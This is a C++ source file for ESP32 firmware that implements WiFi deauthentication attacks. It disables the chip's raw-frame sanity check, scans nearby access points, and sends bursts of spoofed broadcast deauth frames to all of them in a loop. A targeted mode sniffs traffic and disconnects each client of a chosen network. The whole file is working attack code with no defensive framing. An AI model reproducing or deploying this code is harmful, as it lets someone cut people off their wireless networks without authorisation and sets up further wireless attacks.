/**
 * @file deauth.cpp
 * @brief Implementation of WiFi deauthentication attack functions
 * 
 * Contains functions for scanning WiFi networks and sending deauthentication frames
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

// Structure to hold access point information
struct AP_Info {
    uint8_t bssid[6];  // BSSID of the access point
    int32_t channel;   // Channel the AP operates on
};

constexpr int MAX_APS = 30;  // Maximum number of access points to store
AP_Info ap_list[MAX_APS];    // Array to store access point information
int ap_count = 0;            // Counter for how many access points were found
int deauth_iterations = 0;   // Counter for deauth iterations before rescan

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

/**
 * @brief Bypass WiFi frame sanity check (required for raw frame transmission)
 * @param ifx Interface index (unused)
 * @param frame_type Frame type (unused) 
 * @param frame_subtype Frame subtype (unused)
 * @return Always returns 0 (success)
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t ifx, int32_t frame_type, int32_t frame_subtype) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Function to perform a Wi-Fi scan and store AP information
/**
 * @brief Scan for nearby WiFi networks and store AP information
 * 
 * Performs an active scan with optimized parameters and stores up to MAX_APS access points
 */
void performWiFiScan() {
    constexpr uint32_t scanTimePerChannel = 120; // ms per channel
    int n = WiFi.scanNetworks(false, true, true, scanTimePerChannel);
    
    if (n == 0) {
        DEBUG_PRINTLN("[SCAN] No networks found");
        ap_count = 0;
        return;
    }

    ap_count = (n > MAX_APS) ? MAX_APS : n;
    for (int i = 0; i < ap_count; i++) {
        memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
        ap_list[i].channel = WiFi.channel(i);
        DEBUG_PRINTF("[SCAN] AP %d: %02X:%02X:%02X:%02X:%02X:%02X (Ch %d)\n",
                     i, ap_list[i].bssid[0], ap_list[i].bssid[1], ap_list[i].bssid[2],
                     ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5], 
                     ap_list[i].channel);
    }
    
    WiFi.scanDelete();  // Free scan memory
    deauth_iterations = 0;
}

/**
 * @brief Send deauthentication frames to a specific access point
 * @param bssid MAC address of target access point
 * @param channel WiFi channel to operate on
 */
void sendDeauthFrame(uint8_t bssid[6], int channel) {
    // Configure frame once
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame.station, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // Broadcast
    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);

    // Send all frames in batch
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    }

    DEBUG_PRINTF("[DEAUTH] Sent %d frames to %02X:%02X:%02X:%02X:%02X:%02X (Ch %d)\n",
                NUM_FRAMES_PER_DEAUTH, bssid[0], bssid[1], bssid[2],
                bssid[3], bssid[4], bssid[5], channel);
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    eliminated_stations++;
}

/**
 * @brief Perform deauthentication attack on all scanned access points
 * 
 * Manages scan frequency (every 3 iterations) and handles empty scan results
 */
void deauth_all() {
    constexpr int maxIterations = 3; // Number of deauth rounds before rescan
    constexpr uint32_t scanDelay = 1000; // ms between scans
    
    if (deauth_iterations == 0) {
        performWiFiScan(); // Fresh scan on first iteration
    }

    if (ap_count > 0) {
        // Attack all found APs
        for (int i = 0; i < ap_count; i++) {
            sendDeauthFrame(ap_list[i].bssid, ap_list[i].channel);
        }

        deauth_iterations++;
        if (deauth_iterations < maxIterations) {
            delay(scanDelay); // Delay between iterations
            DEBUG_PRINTLN("[DEAUTH] Continuing attack...");
        } else {
            deauth_iterations = 0; // Trigger rescan next time
            DEBUG_PRINTLN("[DEAUTH] Attack cycle completed - will rescan");
        }
    } else {
        delay(scanDelay); // Prevent tight loop when no APs found
        deauth_iterations = 0;
        DEBUG_PRINTLN("[SCAN] No APs found - waiting before rescan");
    }
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
      DEBUG_PRINTF("[DEAUTH] Sent %d frames to station %02X:%02X:%02X:%02X:%02X:%02X\n",
                  NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2],
                  mac_header->src[3], mac_header->src[4], mac_header->src[5]);
      BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    }
  }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;
  deauth_iterations = 0;  // Reset iterations for new attack

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("[MODE] Starting targeted deauth on: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
  } else {
    DEBUG_PRINTLN("[MODE] Starting broadcast deauth on all stations");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);  // Enable promiscuous mode
    esp_wifi_set_promiscuous_filter(&filt);
    deauth_all();  // Initial scan and deauth
  }
}

void stop_deauth() {
  DEBUG_PRINTLN("[MODE] Stopping deauth attack");
  esp_wifi_set_promiscuous(false);
  ap_count = 0;  // Reset AP count
  deauth_iterations = 0;  // Reset iterations
}
